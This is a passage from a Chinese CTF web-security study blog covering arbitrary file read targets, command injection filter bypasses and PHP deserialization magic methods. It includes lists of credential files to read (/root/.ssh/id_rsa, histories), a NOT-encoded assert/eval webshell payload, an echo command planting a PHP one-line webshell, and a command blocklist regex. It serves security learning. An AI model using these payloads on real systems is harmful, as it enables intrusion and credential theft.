class="comment">#程序运行的绝对路径</span></span><br><span class="line"><span class="regexp">/proc/</span>cpuset <span class="comment">#docker环境可以看 machine ID</span></span><br><span class="line"><span class="regexp">/proc/</span>cgroup <span class="comment">#docker环境全是 machine ID 不常用</span></span><br><span class="line"><span class="regexp">/root/</span>.ssh/authorized_keys</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_rsa</span><br><span class="line"><span class="regexp">/root/</span>.ssh/id_ras.keystore</span><br><span class="line"><span class="regexp">/root/</span>.ssh/known_hosts</span><br><span class="line"><span class="regexp">/root/</span>.bash_history</span><br><span class="line"><span class="regexp">/root/</span>.mysql_history</span><br></pre></td></tr></table></figure>

<p>CTF中flag的路径常见读取，爆破测试字典</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/ev0A/ArbitraryFileReadList/">ev0A&#x2F;ArbitraryFileReadList: CTF中任意文件读取的fuzz列表 (Arbitrary file read fuzz list in CTF) (github.com)</a></p>
</blockquote>
<h2 id="八、逻辑漏洞"><a href="#八、逻辑漏洞" class="headerlink" title="八、逻辑漏洞"></a>八、逻辑漏洞</h2><blockquote>
<p>一般在支付购买处代码，对数据处理出现逻辑错误，对用户输入的数据没有进行严格审查，导致逻辑漏洞，使得用户获取不属于他的权限或者信息内容</p>
</blockquote>
<h2 id="九、命令执行"><a href="#九、命令执行" class="headerlink" title="九、命令执行"></a>九、命令执行</h2><h3 id="1-有关命令执行的知识（windows-或-linux-下）"><a href="#1-有关命令执行的知识（windows-或-linux-下）" class="headerlink" title="1.有关命令执行的知识（windows 或 linux 下）:"></a>1.有关命令执行的知识（windows 或 linux 下）:</h3><blockquote>
<p><code>1）command1 ; command2 用;隔开表示为多个命令，命令按照从左到右的顺序执行，彼此无关联，所有的命令都会执行。先执行 command1 后执行 command2</code></p>
<p><code>2）command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</code></p>
<p><code>3）command1 | command2 将两个命令分开，左边命令的输出作为右边命令的输入，只执行 command2</code></p>
<p><code>4）command1 &amp; command2 &amp;表示任务后台执行，与nohup命令功能差不多，先执行 command2 后执行 command1</code></p>
<p><code>5）command1 || command2 先执行 command1，如果为假，再执行 command2</code></p>
<p><code>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</code></p>
</blockquote>
<p>eg:</p>
<p><code>find  / -name &quot;flag* &quot;</code><br>在当前目录及其子目录下查找文件名中包含<code>flag</code>的文件<br><code>find  / -name &quot; *.txt&quot;</code><br>在当前目录及其子目录下查找后缀为<code>txt</code>的文件</p>
<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><h4 id="1-过滤cat"><a href="#1-过滤cat" class="headerlink" title="1.过滤cat"></a>1.过滤cat</h4><blockquote>
<p><code>more，less，head，tac</code>都可以对文本进行读取</p>
</blockquote>
<h4 id="2-过滤空格"><a href="#2-过滤空格" class="headerlink" title="2.过滤空格"></a>2.过滤空格</h4><blockquote>
<p><code>IFS$9、%09、&lt;、&gt;、&lt;&gt;、&#123;,&#125;、%20、$&#123;IFS&#125;、$&#123;IFS&#125;</code>来代替空格</p>
</blockquote>
<blockquote>
<p><code>&lt;,&gt;</code>是把内容导向某个地方，可以是文件，也可以是命令</p>
<p>如<code>cat&lt;flag.php</code>就是相当于，把flag.php内容用cat命令显示出来</p>
<p><code>%09</code>是tab键，可以补全内容</p>
<p>比如过滤了flag，但是需要访问<code>flag233.php</code></p>
<p>那么就可以<code>cat %09*233.php</code>，就可以了</p>
</blockquote>
<h4 id="3-过滤目录分隔符"><a href="#3-过滤目录分隔符" class="headerlink" title="3.过滤目录分隔符"></a>3.过滤目录分隔符</h4><blockquote>
<p>也就是&#x2F;不能用了，不能直接查看文件目录</p>
<p><code>cat /flag_is_here/flag_9012297169124.php</code></p>
<p>可以<strong>利用分号使两个命令同时进行</strong>也就是</p>
<p><code>127.0.0.1;cd flag_is_here;cat flag_9012297169124.php</code></p>
</blockquote>
<h4 id="4-过滤运算符"><a href="#4-过滤运算符" class="headerlink" title="4.过滤运算符"></a>4.过滤运算符</h4><p>可以用<code>;</code>代替管道运算符</p>
<h4 id="5-绕过正则匹配"><a href="#5-绕过正则匹配" class="headerlink" title="5.绕过正则匹配"></a>5.绕过正则匹配</h4><p>比如</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<p><code>所有大小写字母和数字都被正则匹配过滤</code></p>
<p>这里就需要</p>
<h5 id="法1：取反绕过："><a href="#法1：取反绕过：" class="headerlink" title="法1：取反绕过："></a>法1：取反绕过：</h5><p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</p>
</blockquote>
<p>然后再赋值</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意后面要有<code>;</code>代表php代码结束<br>这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反<br>等同于</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="meta">code</span>=(<span class="meta">assert</span>)(eval($_REQUEST[<span class="number">8</span>]))</span><br></pre></td></tr></table></figure>

<p>(assert)因为是assert是函数，被当作函数执行，于是因为<code>断言(eval($_REQUEST[8]))</code>，所以把<code>eval($_REQUEST[8])</code>当作<code>php</code>执行，于是就可以拿到<code>shell</code>了</p>
</blockquote>
<p>蚁剑连接</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h5 id="法2：异或绕过"><a href="#法2：异或绕过" class="headerlink" title="法2：异或绕过:"></a>法2：异或绕过:</h5><p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br> 例如：异或 <code>?</code> 和 <code>~</code> 之后得到的是 <code>A</code></p>
<blockquote>
<p>字符：?         ASCII码：63           二进制：  00‭11 1111‬<br>字符：~         ASCII码：126          二进制：  0111 1110‬<br>异或规则：<br>1   XOR   0   &#x3D;   1<br>0   XOR   1   &#x3D;   1<br>0   XOR   0   &#x3D;   0<br>1   XOR   1   &#x3D;   0<br>上述两个字符异或得到 二进制：  0100 0001<br>该二进制的十进制也就是：65<br>对应的ASCII码是：A</p>
</blockquote>
<p>本题preg_replace()过滤了<code>所有英文字母和数字</code>，但是<em>ASCII码中还有很多<code>字母数字之外的字符</code>，利用这些字符进行异或可以得到我们想要的字符</em></p>
<blockquote>
<p>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</p>
</blockquote>
<h5 id="法3：反斜杠-转义绕过"><a href="#法3：反斜杠-转义绕过" class="headerlink" title="法3：反斜杠\转义绕过"></a>法3：反斜杠\转义绕过</h5><p>对于</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(preg_match(<span class="string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="variable">$ip</span>,<span class="variable">$match</span>)</span></span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这个正则匹配中并没有过滤反斜杠<code>\</code></p>
<p>所以虽然我们执行<code>ls</code>之类会被过滤，但是执行<code>l\s</code>时，会绕过<code>ls</code>的匹配，但是仍然能实现<code>ls</code>的功能</p>
<p>对于文件名比如<code>php</code>过滤，也可以用反义字符<code>p\ph</code>，同样也可以绕过</p>
</blockquote>
<h4 id="6-绕过长度限制"><a href="#6-绕过长度限制" class="headerlink" title="6.绕过长度限制"></a>6.绕过长度限制</h4><p><code>&gt;</code>和<code>&gt;&gt;</code>两个符号的使用</p>
<blockquote>
<p>使用<code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220926223728694.png"><img src="/Web-study/image-20220926223728694.png" alt="image-20220926223728694"></a></p>
<blockquote>
<p><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220926223749908.png"><img src="/Web-study/image-20220926223749908.png" alt="image-20220926223749908"></a></p>
<h4 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2.常用命令"></a>2.常用命令</h4><blockquote>
<p>ls</p>
<p>cat</p>
<p>touch</p>
<p>#创建文件，一般创建脚本文件，</p>
<p>比如<code>touch haha.php</code></p>
<p>然后再执行</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>

<p>，在脚本文件里写一串一句话木马</p>
<p><strong>但是注意因为有$，后面的看可能会被当做变量，所以可以加上反斜杠\转义</strong></p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">echo &quot;</span><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;&gt;&gt;haha.php</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="十、暴力破解"><a href="#十、暴力破解" class="headerlink" title="十、暴力破解"></a>十、暴力破解</h2><blockquote>
<p>一把搜哈就完事（奸笑）</p>
</blockquote>
<h2 id="十一、反序列化漏洞（PHP）"><a href="#十一、反序列化漏洞（PHP）" class="headerlink" title="十一、反序列化漏洞（PHP）"></a>十一、反序列化漏洞（PHP）</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Onlyone_1314/article/details/121461984?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-121461984-blog-108803410.pc_relevant_downloadblacklistv1&utm_relevant_index=2">原文链接1</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274">原文链接2</a></p>
</blockquote>
<h3 id="序列化："><a href="#序列化：" class="headerlink" title="序列化："></a>序列化：</h3><blockquote>
<p><strong>序列化</strong>(Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。</p>
</blockquote>
<h3 id="php的序列化和反序列化"><a href="#php的序列化和反序列化" class="headerlink" title="php的序列化和反序列化"></a>php的序列化和反序列化</h3><blockquote>
<p>概念：<code>php的序列化将对象转化为了字符串，包含了对象的所有数据信息，</code><br><code>反序列化时再根据这些信息还原对象。</code></p>
<p><u>php的序列化和反序列化由</u></p>
<p><u>serialize()和unserialize()</u></p>
<p>这两个函数来完成。</p>
<p>serialize()完成序列化的操作，将传入的值转换为序列化后的字符串；</p>
<p>而unserialize()完成反序列化的操作，将字符串转换成原来的变量。</p>
<p><code>serialize(mixed $value): string</code><br>serialize()返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方：</p>
<p>O::””::{&lt;field name 1&gt;&lt;field value 1&gt;…}</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230502195813375.png"><img src="/Web-study/image-20230502195813375.png" alt="image-20230502195813375"></a></p>
<p>  </p>
<blockquote>
<p>当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 wakeup() 成员函数。<br><code>unserialize(string $str): mixed</code><br>  unserialize()对单一的已序列化的变量进行操作，将其转换回 PHP 的值。<br>若被反序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 wakeup() 成员函数（如果存在的话）。</p>
</blockquote>
<p>注意：</p>
<p><code>private声明</code></p>
<blockquote>
<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</p>
<p>因此私有字段的字段名在序列化时，类名和字段名前面都会加上0的前缀。字符串长度也包括所加前缀的长度</p>
<p>%00也就是空字符，无法复制，只能自己修改二进制，或者自己加上</p>
</blockquote>
<h3 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45552960/article/details/102664372">原文链接</a></p>
</blockquote>
<p> PHP中以两个下划线开头的方法，</p>
<blockquote>
<p><code>__construct(),__destruct(),__call(),__callStatic(),__get(),__set(),__isset(),__unset(),__sleep(),__wakeup(),__toString(),__set_state(),__clone()，__autoload()</code></p>
</blockquote>
<p>被称为”魔术方法”（Magic methods）。这些方法在一定条件下有特殊的功能，在<code>命名自己的类方法时不能使用这些方法名</code>，除非是想使用其魔术功能</p>
<p>与序列化和反序列化的魔术方法主要是：</p>
<blockquote>
<p>__construct()	&#x2F;&#x2F;当一个对象创建时被调用</p>
<p>__destruct() 	&#x2F;&#x2F;对象被销毁时触发</p>
<p>__wakeup() 	&#x2F;&#x2F;使用unserialize时触发</p>
<p>__sleep() 	&#x2F;&#x2F;使用serialize时触发</p>
<p>__toString() 	&#x2F;&#x2F;把类当做字符串时触发<br>1.{因为echo无法输出对象，所以可以利用该魔法方法，在直接输出对象引用的时候，就不会产生错误，而是自动调用了”__toString()”方法, 输出“__toString()”方法中返回的字符，所以“__toString()”方法一定要有个返回值(return 语句)}<br>2.当然除了当作字符串打印时会触发，当把实例化的类当作字符串进行preg_match匹配时，也会触发</p>
<p>__get() 	&#x2F;&#x2F;用于从不可访问的属性读取数据</p>
<p>__set() 	&#x2F;&#x2F;用于将数据写入不可访问的属性</p>
<p>__invoke()  &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</p>
<p>__call()     &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</p>
<p>__callStatic()  &#x2F;&#x2F;在静态上下文中调用不可访问的属性</p>
<p>__isset()   &#x2F;&#x2F;当对不可访问属性调用isset()或empty()时调用</p>
<p>__set_state()   &#x2F;&#x2F;调用var_export()导出类时，此静态方法会被调用。</p>
<p>__clone()  &#x2F;&#x2F;当对象复制完成时调用</p>
<p>__autoload()   &#x2F;&#x2F;尝试加载未定义的类</p>
<p>__debugInfo()   &#x2F;&#x2F;打印所需调试信息</p>
</blockquote>
<p>·注意：</p>
<blockquote>
<p>PHP 将所有以 <code>__</code>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 <code>__</code> 为前缀。</p>
<p><strong>·sleep() 和 wakeup()</strong></p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public __sleep ( void )<span class="keyword"> :</span><span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span>__wakeup ( void )<span class="keyword"> :</span> void</span><br></pre></td></tr></table></figure>

<p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 <code>NULL</code> 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误。</p>
<p><strong>Note</strong></p>
<blockquote>
<ol>
<li>__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。</li>
<li>__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</li>
<li>与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</li>
<li>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</li>
</ol>
</blockquote>
<p><strong>访问控制</strong></p>
<blockquote>
<ul>
<li>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</li>
<li>public（公有）：公有的类成员可以在任何地方被访问。</li>
<li>protected（受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li>private（私有）：私有的类成员则只能被其定义所在的类访问。</li>
</ul>
</blockquote>
<p><code>unserialize() 将已序列化的字符串还原回 PHP 的值。</code><br><code>序列化请使用 serialize() 函数。</code></p>
<p><strong>语法</strong></p>
<blockquote>
<p><code>unserialize(str)</code></p>
<p>参数    描述<br><code>str</code>    必需。一个序列化字符串。<br>__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
</blockquote>
</blockquote>
<hr>
<h4 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h4><p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。但是在<code>序列化</code>和<code>反序列化</code>过程是不会触发的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;F0rmat&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__construct test</span><br></pre></td></tr></table></figure>

<p>可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。</p>
<hr>
<h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4><p>在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct test&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__destruct test</span><br><span class="line">__destruct test</span><br></pre></td></tr></table></figure>

<p>可以看到执行了两次<code>__destruct()</code>，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>
<hr>
<h4 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h4><p>在对象中调用一个不可访问方法时，<code>__call()</code> 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;<span class="title function_ invoke__">abc</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,a</span><br></pre></td></tr></table></figure>

<p>可以看到**__call**需要定义两个参数，一个是表示调用的函数名，一般开发会在这里报错写xxx不存在这个函数，第二个参数是传入的数组，这里只传入了一个a。</p>
<hr>
<h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h4><p>在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call xxx,a</span><br></pre></td></tr></table></figure>

<p>这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 <strong>self</strong>，<strong>parent</strong> 和 <strong>static</strong>）。与**__call<strong>不同的是需要添加</strong>static**，只有访问不存在的静态方法才会触发。</p>
<hr>
<h4 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h4><p>读取不可访问属性的值时，<code>__get()</code> 会被调用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure>

<p><code>__get</code>魔术方法需要一个参数，这个参数代表着访问不存在的属性值。</p>
<hr>
<h4 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h4><p>给不可访问属性赋值时，<code>__set()</code> 会被调用。</p>
